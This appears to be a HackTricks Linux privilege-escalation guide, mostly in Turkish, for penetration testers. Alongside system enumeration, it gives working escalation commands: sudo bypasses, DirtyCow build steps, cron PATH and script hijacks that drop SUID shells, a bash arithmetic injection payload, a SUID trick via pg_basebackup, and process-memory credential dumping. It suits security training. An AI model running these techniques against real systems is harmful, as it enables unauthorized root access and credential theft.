# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Sistem Bilgileri

### İşletim Sistemi bilgisi

Çalışan işletim sistemi hakkında bilgi edinmeye başlayalım
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Eğer `PATH` değişkeni içindeki herhangi bir klasöre **yazma izinleriniz** varsa bazı libraries veya binaries hijack yapabilirsiniz:
```bash
echo $PATH
```
### Env bilgisi

Ortam değişkenlerinde ilginç bilgiler, şifreler veya API keys var mı?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Çekirdek sürümünü kontrol edin ve ayrıcalıkları yükseltmek için kullanılabilecek bir exploit olup olmadığını kontrol edin
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
İyi bir vulnerable kernel listesi ve bazı **compiled exploits**'i şurada bulabilirsiniz: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) ve [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Bazı **compiled exploits** bulabileceğiniz diğer siteler: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

O siteden tüm vulnerable kernel sürümlerini çıkarmak için şunu yapabilirsiniz:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Kernel exploitlerini aramada yardımcı olabilecek araçlar:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (hedefte çalıştırın, yalnızca kernel 2.x için exploitleri kontrol eder)

Her zaman **kernel sürümünü Google'da arayın**, belki kernel sürümünüz bazı kernel exploit'lerinde yazılıdır ve böylece bu exploit'in geçerli olduğundan emin olursunuz.

Additional kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo sürümü

Aşağıda görünen savunmasız Sudo sürümlerine göre:
```bash
searchsploit sudo
```
sudo sürümünün savunmasız olup olmadığını grep ile kontrol edebilirsiniz.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo 1.9.17p1 öncesi sürümleri (**1.9.14 - 1.9.17 < 1.9.17p1**) kullanıcı kontrollü bir dizinden `/etc/nsswitch.conf` dosyası kullanıldığında sudo `--chroot` seçeneği aracılığıyla ayrıcalıksız yerel kullanıcıların ayrıcalıklarını root'a yükseltmesine izin verir.

İşte o [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) o [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463)'ı exploit etmek için. Exploit'i çalıştırmadan önce `sudo` sürümünüzün vulnerable olduğundan ve `chroot` özelliğini desteklediğinden emin olun.

Daha fazla bilgi için orijinal [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)'e bakın.

### Sudo host-based rules bypass (CVE-2025-32462)

Sudo 1.9.17p1 öncesi (rapor edilen etkilenen aralık: **1.8.8–1.9.17**) host tabanlı sudoers kurallarını `sudo -h <host>`'ten alınan **user-supplied hostname** kullanarak **real hostname** yerine değerlendirebilir. Eğer sudoers başka bir hostta daha geniş ayrıcalık veriyorsa, o hostu yerel olarak **spoof** edebilirsiniz.

Gereksinimler:
- Vulnerable sudo sürümü
- Host-specific sudoers kuralları (host mevcut hostname veya `ALL` değil)

Örnek sudoers pattern:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Exploit: izin verilen host'u spoofing yaparak:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Spooflanan adın çözümü engelleniyorsa, bunu `/etc/hosts` dosyasına ekleyin veya DNS lookups'ı önlemek için logs/configs'ta zaten görünen bir hostname kullanın.

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg imza doğrulaması başarısız oldu

Bu vuln'ün nasıl exploited olabileceğine dair bir **örnek** için **smasher2 box of HTB**'yi kontrol edin.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Daha fazla sistem keşfi
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Olası savunmaları listele

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Eğer bir container içindeyseniz, aşağıdaki container-security bölümünden başlayın ve ardından runtime-specific abuse sayfalarına pivot yapın:


{{#ref}}
container-security/
{{#endref}}

## Sürücüler

Kontrol edin **what is mounted and unmounted**, nerede ve neden. Eğer herhangi bir şey unmounted ise, onu mount etmeyi deneyebilir ve özel bilgileri kontrol edebilirsiniz
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Faydalı yazılımlar

Kullanışlı binaries'leri sıralayın
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Ayrıca, **herhangi bir compiler'ın yüklü olup olmadığını kontrol edin**. Bu, bazı kernel exploit'leri kullanmanız gerekirse faydalıdır; çünkü onları kullanacağınız makinede (veya benzer bir makinede) compile etmeniz önerilir.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Yüklü Zafiyetli Yazılımlar

Yüklü paketlerin ve servislerin **sürümlerini** kontrol edin. Örneğin eski bir Nagios sürümü olabilir; bu, privilege escalation için exploit edilebilir…\
Daha şüpheli görünen yüklü yazılımların sürümlerini elle kontrol etmeniz önerilir.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Bu komutlar çoğunlukla işe yaramayacak çok fazla bilgi gösterecektir; bu nedenle yüklü herhangi bir yazılım sürümünün bilinen exploits'lere karşı zafiyetli olup olmadığını kontrol edecek OpenVAS veya benzeri uygulamaların kullanılması önerilir_

## İşlemler

Hangi **işlemlerin** çalıştırıldığını inceleyin ve herhangi bir işlemin olması gerekenden **daha fazla ayrıcalığa** sahip olup olmadığını kontrol edin (belki tomcat root tarafından çalıştırılıyordur?).
```bash
ps aux
ps -ef
top -n 1
```
Her zaman [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md) olasılığını kontrol et. **Linpeas** bunları process'in komut satırındaki `--inspect` parametresini kontrol ederek tespit eder.\
Ayrıca **process'lerin binary'leri üzerindeki ayrıcalıklarını kontrol et**, belki birini üstüne yazabilirsin.

### Kullanıcılar arası ebeveyn-çocuk zincirleri

Bir child process'in parent'ından farklı bir **kullanıcı** altında çalışması otomatik olarak kötü niyetli değildir, fakat faydalı bir **triage signal**'dır. Bazı geçişler beklenir (`root`'un bir servis kullanıcısı başlatması, login yöneticilerinin oturum işlemleri oluşturması), ancak olağandışı zincirler wrappers, debug helpers, persistence veya weak runtime trust boundaries gibi şeyleri ortaya çıkarabilir.

Hızlı gözden geçirme:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Eğer şaşırtıcı bir zincir bulursanız, ebeveyn komut satırını ve davranışını etkileyen tüm dosyaları inceleyin (`config`, `EnvironmentFile`, yardımcı betikler, çalışma dizini, yazılabilir argümanlar). Birkaç gerçek privesc yolunda alt süreç kendisi yazılabilir değildi, fakat **ebeveyn tarafından kontrol edilen config** veya yardımcı zincir yazılabilirdi.

### Silinmiş yürütülebilir dosyalar ve silindikten sonra hâlâ açık kalan dosyalar

Çalışma zamanı artefaktları genellikle **silindikten sonra** hâlâ erişilebilir durumdadır. Bu, hem privilege escalation için hem de zaten hassas dosyaları açık tutan bir süreçten delil kurtarmak için faydalıdır.

Silinmiş yürütülebilir dosyaları kontrol edin:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Eğer `/proc/<PID>/exe` `(deleted)`'i işaret ediyorsa, süreç hâlâ eski ikili görüntüyü bellekten çalıştırıyordur. Bu, soruşturulması gereken güçlü bir işarettir çünkü:

- kaldırılan executable ilginç strings veya credentials içerebilir
- çalışan süreç hâlâ yararlı file descriptors açığa vuruyor olabilir
- silinmiş bir privileged binary yakın zamanda yapılan müdahale veya temizleme girişimine işaret edebilir

Sistem genelinde deleted-open dosyalarını topla:
```bash
lsof +L1
```
Eğer ilginizi çeken bir descriptor bulursanız, onu doğrudan kurtarın:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Bu, özellikle bir işlem hala silinmiş bir secret, script, database export veya flag file açıkken çok değerlidir.

### İşlem izleme

İşlemleri izlemek için [**pspy**](https://github.com/DominicBreuker/pspy) gibi araçları kullanabilirsiniz. Bu, sıkça çalıştırılan veya belirli gereksinimler karşılandığında çalışan zafiyetli işlemleri tespit etmek için çok faydalı olabilir.

### İşlem belleği

Bazı sunucu servisleri belleğin içinde **credentials**i düz metin olarak saklar.\
Normalde diğer kullanıcıların işlemlerinin belleğini okumak için **root privileges** gerekir, bu yüzden bu genellikle zaten root olduğunuzda ve daha fazla credentials keşfetmek istediğinizde daha kullanışlıdır.\
Ancak unutmayın ki **normal bir kullanıcı olarak, sahip olduğunuz işlemlerin belleğini okuyabilirsiniz**.

> [!WARNING]
> Günümüzde çoğu makinenin varsayılan olarak **ptrace'e izin vermediğini** ve bunun da yetkisiz kullanıcınıza ait diğer prosesleri dump edemeyeceğiniz anlamına geldiğini unutmayın.
>
> _**/proc/sys/kernel/yama/ptrace_scope**_ dosyası ptrace'in erişilebilirliğini kontrol eder:
>
> - **kernel.yama.ptrace_scope = 0**: aynı uid'ye sahip oldukları sürece tüm işlemler debug edilebilir. Bu, ptrace'in klasik çalışma şeklidir.
> - **kernel.yama.ptrace_scope = 1**: sadece ebeveyn bir işlem debug edilebilir.
> - **kernel.yama.ptrace_scope = 2**: Sadece admin ptrace kullanabilir, çünkü bu CAP_SYS_PTRACE yeteneğini gerektirir.
> - **kernel.yama.ptrace_scope = 3**: Hiçbir işlem ptrace ile izlenemez. Bir kez ayarlandığında, ptrace'i tekrar etkinleştirmek için yeniden başlatma gerekir.

#### GDB

Örneğin bir FTP servisinin belleğine erişiminiz varsa Heap'i alıp içindeki credentials'ları arayabilirsiniz.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Betiği
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Belirli bir işlem kimliği (PID) için, **maps**, o işlemin sanal adres alanı içinde belleğin nasıl eşlendiğini gösterir; ayrıca **her eşlenmiş bölgenin izinlerini** gösterir. **mem** pseudo dosyası **işlemin belleğini bizzat ortaya çıkarır**. **maps** dosyasından hangi **bellek bölgelerinin okunabilir** olduğunu ve bunların offsetlerini biliriz. Bu bilgiyi kullanarak **mem dosyasında seek yapar ve tüm okunabilir bölgeleri bir dosyaya dump ederiz**.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` sistemin **fiziksel** belleğine erişim sağlar, sanal belleğe değil. Çekirdeğin sanal adres alanına /dev/kmem kullanılarak erişilebilir.\
Genellikle, `/dev/mem` sadece **root** ve **kmem** grubundan okunabilir.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump, Sysinternals araç setindeki Windows için klasik ProcDump aracının Linux için yeniden tasarlanmış halidir. Edinin: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Araçlar

Bir işlemin belleğini dump etmek için şunları kullanabilirsiniz:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root gereksinimlerini elle kaldırıp sahip olduğunuz işlemi dump edebilirsiniz
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root gereklidir)

### İşlem Belleğinden Kimlik Bilgileri

#### Manuel örnek

Eğer authenticator işlemi çalışıyorsa:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Process'i dump edebilir (önceki bölümlere bakarak bir process'in belleğini dump etmenin farklı yollarını bulabilirsiniz) ve bellekte kimlik bilgilerini arayabilirsiniz:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

The tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) bellekten **clear text credentials** ve bazı **iyi bilinen dosyalardan** kimlik bilgilerini çalar. Doğru çalışması için root ayrıcalıkları gerektirir.

| Özellik                                           | Süreç Adı            |
| ------------------------------------------------- | -------------------- |
| GDM parolası (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Arama Regex'leri/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zamanlanmış/Cron işler

### Crontab UI (alseambusher) root olarak çalışıyorsa – web tabanlı zamanlayıcı privesc

Eğer bir web “Crontab UI” paneli (alseambusher/crontab-ui) root olarak çalışıyor ve yalnızca loopback'e bağlıysa, yine de SSH local port-forwarding ile ona ulaşabilir ve yetki yükseltmek için ayrıcalıklı bir job oluşturabilirsiniz.

Tipik zincir
- Yalnızca loopback'e bağlı portu keşfet (ör., 127.0.0.1:8000) ve Basic-Auth realm'i `ss -ntlp` / `curl -v localhost:8000` ile tespit et
- Kimlik bilgilerini operasyonel artefaktlarda bul:
  - `zip -P <password>` ile şifrelenmiş yedekler/scriptler
  - systemd biriminde `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` olarak ayarlanmış
- Tünelle bağlanıp giriş yap:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Yüksek ayrıcalıklı bir job oluştur ve hemen çalıştır (SUID shell bırakır):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Kullanın:
```bash
/tmp/rootshell -p   # root shell
```
Sertleştirme
- Crontab UI'yi root olarak çalıştırmayın; özel bir kullanıcı ve minimum izinlerle kısıtlayın
- localhost'a bind edin ve ek olarak erişimi firewall/VPN ile kısıtlayın; parolaları yeniden kullanmayın
- unit dosyalarına secrets gömmekten kaçının; secret stores veya sadece root erişimli EnvironmentFile kullanın
- on-demand job yürütmeleri için audit/logging'i etkinleştirin

Herhangi bir zamanlanmış görevin zafiyeti olup olmadığını kontrol edin. Belki root tarafından çalıştırılan bir script'ten faydalanabilirsiniz (wildcard vuln? root'un kullandığı dosyaları değiştirebilir misiniz? symlinks kullanmak? root'un kullandığı dizine özel dosyalar oluşturmak?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Eğer `run-parts` kullanılıyorsa, gerçekten hangi isimlerin çalıştırılacağını kontrol edin:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Bu yanlış pozitifleri önler. Yazılabilir bir periodic dizini yalnızca payload dosya adınız yerel `run-parts` kurallarıyla eşleşiyorsa işe yarar.

### Cron yolu

Örneğin, _/etc/crontab_ içinde PATH şu şekilde bulunur: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Kullanıcı "user"ın /home/user üzerinde yazma yetkisine sahip olduğuna dikkat edin_)

Eğer bu crontab içinde root kullanıcısı PATH'i ayarlamadan herhangi bir komut veya script çalıştırmaya çalışırsa. Örneğin: _\* \* \* \* root overwrite.sh_\
Böylece, root shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron wildcard içeren bir script kullanımı (Wildcard Injection)

Bir script root tarafından çalıştırılıyor ve bir komut içinde “**\***” varsa, bunu beklenmeyen şeyler (ör. privesc) için istismar edebilirsiniz. Örnek:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Eğer wildcard şu gibi bir yolun önünde yer alıyorsa** _**/some/path/\***_ **, bu vulnerable değildir (hatta** _**./\***_ **de değildir).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. If a root cron/parser reads untrusted log fields and feeds them into an arithmetic context, an attacker can inject a command substitution $(...) that executes as root when the cron runs.

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Parsed log içine attacker-controlled metin yazdırın ki sayıya benzeyen alan command substitution içersin ve bir rakamla bitsin. Komutunuzun stdout'a yazmadığından emin olun (veya yönlendirin) böylece arithmetic geçerli kalır.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Eğer root tarafından çalıştırılan script **tam erişiminizin olduğu bir dizini** kullanıyorsa, o klasörü silip sizin kontrolünüzde bir script sunan başka bir dizine **symlink klasörü oluşturmak** faydalı olabilir.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink doğrulaması ve daha güvenli dosya işlemleri

Path ile dosya okuyan veya yazan privileged scripts/binaries'leri incelerken, links'in nasıl işlendiğini doğrulayın:

- `stat()` bir symlink'i takip eder ve hedefin metadata'sını döndürür.
- `lstat()` link'in kendisinin metadata'sını döndürür.
- `readlink -f` ve `namei -l` son target'ı çözmeye yardımcı olur ve her path bileşeninin izinlerini gösterir.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Savunucular/geliştiriciler için symlink tricks'e karşı daha güvenli yaklaşımlar şunlardır:

- `O_EXCL` with `O_CREAT`: path zaten varsa hata ver (attacker tarafından önceden oluşturulan link/dosyaları engeller).
- `openat()`: güvenilen bir dizin file descriptor'ına göre işlem yapın.
- `mkstemp()`: güvenli izinlerle geçici dosyaları atomik olarak oluşturun.

### Yazılabilir payload'lara sahip custom-signed cron binaries
Blue teams bazen cron-driven binaries'i "sign" eder; özel bir ELF bölümü döküp vendor string için grep'ledikten sonra root olarak çalıştırırlar. Eğer o binary group-writable ise (ör. `/opt/AV/periodic-checks/monitor` sahibi `root:devs 770`) ve signing material'ı leak edebiliyorsanız, bölümü sahteleyip cron görevini ele geçirebilirsiniz:

1. Doğrulama akışını yakalamak için `pspy` kullanın. In Era, root `objcopy --dump-section .text_sig=text_sig_section.bin monitor` çalıştırdı, ardından `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` çalıştırdı ve sonra dosyayı yürüttü.
2. Beklenen sertifikayı leaked key/config kullanarak yeniden oluşturun (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Kötü amaçlı bir yedek oluşturun (ör. bir SUID bash bırakmak, SSH key'inizi eklemek) ve sertifikayı `.text_sig` içine gömün ki grep geçsin:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Scheduled binary'nin execute bitlerini koruyarak üzerine yazın:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Bir sonraki cron çalışmasını bekleyin; naif signature check başarılı olunca payload'ınız root olarak çalışır.

### Frequent cron jobs

Process'leri izleyerek her 1, 2 veya 5 dakikada bir çalıştırılan process'leri arayabilirsiniz. Belki bundan faydalanıp privileges yükseltebilirsiniz.

For example, to **1 dakika boyunca her 0.1s'de izlemek**, **daha az yürütülen komutlara göre sırala** ve en çok çalıştırılan komutları silmek için, şunu yapabilirsiniz:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ayrıca kullanabilirsiniz** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (başlayan her işlemi izleyecek ve listeleyecektir).

### Atakçının ayarladığı izin bitlerini koruyan root yedekleri (pg_basebackup)

Eğer root'e ait bir cron, yazabileceğiniz bir veritabanı dizinine karşı `pg_basebackup` (veya herhangi bir recursive copy) çalıştırıyorsa, yedek çıktısına aynı izin bitleriyle **root:root** olarak yeniden kopyalanacak bir **SUID/SGID binary** yerleştirebilirsiniz.

Tipik keşif akışı (düşük ayrıcalıklı DB kullanıcısı olarak):
- `pspy` kullanarak, root'e ait cron'un her dakika `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` gibi bir çağrı yaptığını tespit edin.
- Kaynak cluster'ın (ör. `/var/lib/postgresql/14/main`) sizin tarafınızdan yazılabilir olduğunu ve görevden sonra hedefin (`/opt/backups/current`) root tarafından sahiplenildiğini doğrulayın.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Bu, `pg_basebackup` küme kopyalarken dosya mod biti bilgilerini koruduğu için çalışır; root tarafından çağrıldığında hedef dosyalar **root sahipliği + saldırganın seçtiği SUID/SGID** miras alır. İzinleri koruyan ve yürütülebilir bir konuma yazan benzer herhangi bir ayrıcalıklı backup/copy rutini savunmasızdır.

### Görünmez cron jobs

Bir yorumdan sonra **yeni satır karakteri olmadan carriage return koyarak** bir cronjob oluşturmak mümkündür ve cron job çalışır. Örnek (carriage return karakterine dikkat):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Bu tür gizli girişleri tespit etmek için, kontrol karakterlerini açığa çıkaran araçlarla cron dosyalarını inceleyin:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Servisler

### Yazılabilir _.service_ dosyaları

Herhangi bir `.service` dosyası yazıp yazamayacağınızı kontrol edin; yazabiliyorsanız, **değiştirebilirsiniz** böylece servis **başlatıldığında**, **yeniden başlatıldığında** veya **durdurulduğunda** backdoor'unuz **çalıştırılacaktır** (makinenin yeniden başlatılmasını beklemeniz gerekebilir).\
For example create your backdoor inside the .service file with **`ExecStart=/tmp/script.sh`**

### Yazılabilir servis binaries

Unutmayın ki eğer **servisler tarafından çalıştırılan binaries üzerinde yazma iznine** sahipseniz, bunları backdoor yerleştirecek şekilde değiştirebilir ve servisler tekrar çalıştırıldığında backdoor'lar da çalıştırılacaktır.

### systemd PATH - Relative Paths

systemd tarafından kullanılan PATH'i şu komutla görebilirsiniz:
```bash
systemctl show-environment
```
Yolun herhangi bir klasörüne **yazabildiğinizi** fark ederseniz, **ayrıcalıkları yükseltebilirsiniz**. Servis yapılandırma dosyalarında kullanılan **göreli yolları** şu tür dosyalarda aramanız gerekir:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Then, yazma izniniz olan systemd PATH klasörünün içine, göreli yol üzerindeki binary ile aynı ada sahip bir executable oluşturun; hizmetten korunmasız eylemi (**Start**, **Stop**, **Reload**) çalıştırması istendiğinde backdoor'unuz çalıştırılacaktır (imtiyazı olmayan kullanıcılar genellikle hizmetleri başlatıp/durduramazlar; ancak `sudo -l` kullanıp kullanamayacağınızı kontrol edin).

